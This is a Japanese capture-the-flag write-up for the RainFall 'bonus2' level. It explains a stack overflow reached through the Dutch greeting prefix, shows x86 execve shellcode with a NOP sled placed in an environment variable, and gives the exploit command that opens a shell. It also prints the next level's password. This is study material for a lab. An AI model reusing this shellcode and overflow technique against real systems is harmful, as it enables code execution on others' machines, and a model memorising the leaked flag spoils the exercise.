# bonus2

## 方針
argvを２つとり、それぞれbufferA,Bに合計72バイトをstrncpyする。
その後、環境変数で何も指定されなければ、greetuserで`"Hello "` + bufferA,Bが連結され、greeting[72]が6バイトのバッファオーバフローする。
ただし、`"Hello "`だと６バイトしか書き換えられず、リターンアドレスまで届かないため、リターンアドレスまで届くようにプレフィックスを`"Goedemiddag! "`か`"Hyvää päivää "`にする必要がある。

greeting[72]は72バイトだから76バイト適当に埋め、環境変数へのリターンアドレスを書き込む。

### 環境変数のアドレスを調べる


下記からCSのアドレスが0xbffffb3bなのがわかる.
```
export LANG=nl
export CS=$(python -c "import sys; sys.stdout.write( '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')")


(gdb) b main
Breakpoint 1 at 0x804852f

(gdb) x/20s *environ
0xbffffb3b:      "CS=\220\220\220
```


### ans

0xbffffb3b + 300
"Goedemiddag! " + 'A' * 40 +  'B' * 23 = 76

```
bonus2@RainFall:~$ ./bonus2 $(python -c "import sys; sys.stdout.write( 'A' * 40)") $(python -c "import sys; sys.stdout.write('B' * 23 + '\x67\xfc\xff\xbf')")
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBg���
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```


## memo

gdbとスタックはアドレスの位置が数10~数100バイトずれるからnop命令を大量に入れて差分があっても問題ないようする。

### nop

nopは何もしない命令、次の命令に進だけ